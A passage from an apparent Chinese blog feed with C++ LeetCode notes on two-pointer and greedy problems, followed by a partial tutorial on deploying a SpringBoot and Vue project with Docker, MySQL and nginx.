class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="type">bool</span> has_cycle = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow || has_cycle) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fast == <span class="literal">nullptr</span> || fast-&gt;next == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            has_cycle = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：<strong>Floyd判圈算法</strong>：对于链表找环路的问题，有一个通用的解法——快慢指针（Floyd 判圈法）。给定两个指针，分别命名为 slow 和 fast，起始位置在链表的开头。每次 fast 前进两步，slow 前进一步。如果 fast 可以走到尽头，那么说明没有环路；如果 fast 可以无限走下去，那么说明一定有环路，且一定存在一个时刻 slow 和 fast 相遇。当 slow 和 fast 第一次相遇时，我们将 fast 重新移动到链表开头，并 让 slow 和 fast 每次都前进一步。当 slow 和 fast 第二次相遇时，相遇的节点即为环路的开始点。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/sum-of-square-numbers/">平方数之和</a><br>给定一个非负整数 <code>c</code> ，你要判断是否存在两个整数 <code>a</code> 和 <code>b</code>，使得 <code>a^2 + b^2 = c</code> 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">0</span>, b = <span class="built_in">sqrt</span>(c);</span><br><span class="line">        <span class="keyword">while</span> (a &lt;= b) &#123;</span><br><span class="line">            <span class="type">long</span> sum = (<span class="type">long</span>) a * a + (<span class="type">long</span>) b * b;</span><br><span class="line">            <span class="keyword">if</span> (sum &lt; c) ++a;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; c) --b;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：最大值的选择为开方。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-word-in-dictionary-through-deleting/">通过删除字母匹配到字典里最长单词</a><br>给你一个字符串 <code>s</code> 和一个字符串数组 <code>dictionary</code> ，找出并返回 <code>dictionary</code> 中最长的字符串，该字符串可以通过删除 <code>s</code> 中的某些字符得到。<br>如果答案不止一个，返回长度最长且字母序最小的字符串。如果答案不存在，则返回空字符串。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">aHasb</span><span class="params">(string a, string b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; a.<span class="built_in">length</span>() &amp;&amp; j &lt; b.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] == b[j]) ++j;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j == b.<span class="built_in">length</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">findLongestWord</span><span class="params">(string s, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dictionary.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">-1</span> &amp;&amp; (dictionary[i].<span class="built_in">length</span>() &lt; dictionary[res].<span class="built_in">length</span>() ||                 (dictionary[i].<span class="built_in">length</span>() == dictionary[res].<span class="built_in">length</span>() &amp;&amp; dictionary[i] &gt;                                dictionary[res]))) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="built_in">aHasb</span>(s, dictionary[i]);</span><br><span class="line">            <span class="keyword">if</span> (flag) res = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == <span class="number">-1</span> ? <span class="string">&quot;&quot;</span> : dictionary[res];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：双指针分别用于两个字符串的开头来判断包含关系。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(一): 贪心</title>
      <link href="/post/4d5c39be.html"/>
      <url>/post/4d5c39be.html</url>
      
        <content type="html"><![CDATA[<p>贪心算法的核心思想：局部最优以实现全局最优。</p><h2 id="一、分配问题"><a href="#一、分配问题" class="headerlink" title="一、分配问题"></a>一、分配问题</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/candy">分发糖果</a><br>n 个孩子站成一排。给你一个整数数组 ratings 表示每个孩子的评分。<br>你需要按照以下要求，给这些孩子分发糖果：</p><ul><li>每个孩子至少分配到 1 个糖果。</li><li>相邻两个孩子中，评分更高的那个会获得更多的糖果。<br>请你给每个孩子分发糖果，计算并返回需要准备的最少糖果数目。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;ratings)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">candies</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &gt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i] = candies[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &lt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i - <span class="number">1</span>] = <span class="built_in">max</span>(candies[i - <span class="number">1</span>], candies[i] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">accumulate</span>(candies.<span class="built_in">begin</span>(), candies.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>提示：两次遍历，每次只用关注相邻的一边即可。</p></li></ul><h2 id="二、区间问题"><a href="#二、区间问题" class="headerlink" title="二、区间问题"></a>二、区间问题</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/non-overlapping-intervals">无重叠区间</a><br>给定一个区间的集合 intervals ，其中 intervals[i] &#x3D; [starti, endi] 。返回需要移除区间的最小数量，使剩余区间互不重叠。<br>注意：只在一点上接触的区间是不重叠的。例如 [1, 2] 和 [2, 3] 是不重叠的。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">eraseOverlapIntervals</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; &amp;b)</span><br><span class="line">             &#123; <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>]; &#125;);</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt; interval : intervals) &#123;</span><br><span class="line">            <span class="keyword">if</span> (interval[<span class="number">0</span>] &lt; prev)</span><br><span class="line">                count++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = interval[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：要做到尽量互不重叠即需要保留end越小越好。</p></li></ul><h2 id="三、练习"><a href="#三、练习" class="headerlink" title="三、练习"></a>三、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">买卖股票的最佳时机 II</a><br>给你一个整数数组 prices ，其中 prices[i] 表示某支股票第 i 天的价格。<br>在每一天，你可以决定是否购买和&#x2F;或出售股票。你在任何时候最多只能持有一股股票。你也可以先购买，然后在同一天出售。<br>返回你能获得的最大利润 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> prev = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; prev) &#123;</span><br><span class="line">                prev = prices[i];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += (prices[i] - prev);</span><br><span class="line">            prev = prices[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：动态规划 is always right。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/partition-labels/">划分字母区间</a><br>给你一个字符串s。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。例如，字符串”ababcc”能够被分为[“abab”, “cc”]，但类似[“aba”, “bcc”] 或[“ab”, “ab”, “cc”]的划分是非法的。<br>注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是s。<br>返回一个表示每个字符串片段的长度的列表。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash1</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash2</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; intervals;</span><br><span class="line">        intervals.<span class="built_in">reserve</span>(<span class="number">52</span>);</span><br><span class="line">        <span class="type">int</span> length = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>)</span><br><span class="line">                hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">                hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">                vector&lt;<span class="type">int</span>&gt; interval = &#123;hash2[s[i] - <span class="string">&#x27;a&#x27;</span>], hash1[s[i] - <span class="string">&#x27;a&#x27;</span>]&#125;;</span><br><span class="line">                intervals.<span class="built_in">push_back</span>(interval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        res.<span class="built_in">reserve</span>(length);</span><br><span class="line">        <span class="type">int</span> start = intervals[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; intervals.<span class="built_in">size</span>(); i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &lt; prev) </span><br><span class="line">                prev = prev &gt; intervals[i][<span class="number">1</span>] ? prev : intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">                start = intervals[i][<span class="number">0</span>];</span><br><span class="line">                prev = intervals[i][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记录开始和结束位置转化为区间问题。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker部署SpringBoot+Vue前后端分离项目</title>
      <link href="/post/70e0611f.html"/>
      <url>/post/70e0611f.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：致敬软院传奇专业核心课程软工二：大作业卷得飞起<del>(怎么有小组做了10个自由需求甚至做了CICD的啊)</del>，上课全在讲笑话期末考得一坨屎<del>(本fw期末喜提卷面68分)</del>。因为sb课程部署项目会加分，故有了这篇快速教学文章(文章不会涉及原理，只教如何使用工具)，希望能对学习部署的人有所帮助。</p><h2 id="一、下载docker"><a href="#一、下载docker" class="headerlink" title="一、下载docker"></a>一、下载docker</h2><ul><li><p>在你的云服务器上(一般都是选择ubuntu系统)执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io docker-buildx</span><br></pre></td></tr></table></figure></li><li><p>下载完docker后因为docker的官方源需要梯子，所以要更换镜像源，进入<code>/etc/docker</code>文件夹并创建<code>daemon.json</code>文件，加入以下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p>添加完毕之后输入<code>sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</code>命令重新启动docker，这一步之后输入<code>docker run hello-world</code>查看是否能够正常拉取镜像，结果应该如图所示：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/dfe43bf78d3322e1e8d31d56f924d977.png" alt="拉取hello-world镜像"></p><p>至此，docker的安装已完成。</p><p>安装完成后可以先为你的项目创建一个网络，使用<code>docker network create your_network_name</code></p><h2 id="二、部署mysql"><a href="#二、部署mysql" class="headerlink" title="二、部署mysql"></a>二、部署mysql</h2><ul><li><p><code>mysql</code>的部署非常简单，输入以下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mysql --network your_network_name -p 3306:3306 \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=your_root_password -e MYSQL_DATABASE=your_database_name \</span><br><span class="line">  mysql:latest</span><br></pre></td></tr></table></figure></li></ul><p>然后再输入<code>docker ps</code>查看部署情况：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/017639f4d7b60ceeedec7233fcd0061b.png" alt="017639f4d7b60ceeedec7233fcd0061b"></p><h2 id="三、部署后端"><a href="#三、部署后端" class="headerlink" title="三、部署后端"></a>三、部署后端</h2><ul><li>在部署后端之前，要先对后端项目进行打包，需要使用maven工具。下面以idea来做演示：</li></ul><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/5bc1b6124afb368fc6305922ff0882a1.png" alt="使用maven打包后端"></p><p>​打包完成之后，在<code>target/</code>目录下会出现一个jar包，这个jar包就是我们部署后端需要的核心部件。</p><ul><li><p>创建<code>/opt/your_project_name/backend</code>目录来存放后端部署文件，将上面的jar包放入该文件夹，同时我们还需要后端运行的配置文件(<code>yaml</code>文件或者是<code>properties</code>文件)和<code>Dockerfile</code>部署文件。</p></li><li><p><code>application.yaml</code>(示例)文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://mysql:3306/smartpricing?characterEncoding=utf-8&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=Asia/Shanghai&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li></ul><p>​注意这里的<code>url</code>不再是<code>mysql://localhost:3306</code>而是<code>mysql://mysql:3306</code>，也就是把主机名换成了你部署的<code>mysql</code>的容器名。</p><ul><li><p><code>Dockerfile</code>(示例)文件如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用官方的 OpenJDK 21 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/smart-pricing/backend</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 JAR 文件和 application.yml 复制到工作目录中</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> smart-pricing.jar ./smart-pricing.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> application.yml ./config/application.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置时区为上海</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露应用程序端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定容器启动时执行的命令，运行 Spring Boot 应用</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;java -Dspring.config.location=file:./config/application.yml -jar smart-pricing.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure></li></ul><p>​因为本地后端配置和云服务器的后端配置文件不一样，所以需要指定选择配置文件来运行。</p><ul><li><p>这三个文件都准备好后，就在该目录下执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t your_backend_name:1.0.0 .</span><br><span class="line">docker run -d -p 8080:8080 --name your_backend_container_name --network your_network_name your_backend_name:1.0.0</span><br></pre></td></tr></table></figure></li></ul><p>输入<code>docker ps</code>查看部署情况：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8102b7624f46ac70b15808619bd45907.png" alt="查看后端部署情况"></p><p>至此后端部署完成。</p><h2 id="四、部署前端"><a href="#四、部署前端" class="headerlink" title="四、部署前端"></a>四、部署前端</h2><ul><li><p>和后端一样，在部署前端之前要先对前端项目进行打包。直接在前端项目目录下输入命令<code>npm run build</code>既可完成打包。成功之后应该会生成一个<code>dist/</code>文件夹，这个文件夹里面的东西就是我们部署需要的资源。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/f993850605cb0bc06581c4525c984ba6.png" alt="dist文件夹"></p></li><li><p>创建目录<code>/opt/your_project_name/nginx</code>和<code>/opt/your_project_name/nginx/html</code>，将<code>dist/</code>文件下的全部东西都放<code>html/</code>文件下，然后在<code>nginx/</code>文件夹下我们还需要一个<code>nginx.conf</code>文件来配置nginx服务。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/015635b869338c4c2d393fa45af91a0c.png" alt="nginx文件结构"></p></li><li><p><code>nginx.conf</code>文件(示例)如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>; //处理器使用数量</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">256</span>;  //最大连接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  your_sever_public_ip;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;  //资源定位</span><br><span class="line">            <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> /prod-api/ &#123;  //将/prod-api请求转发到后端</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://your_backend_container_name:8080/;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> 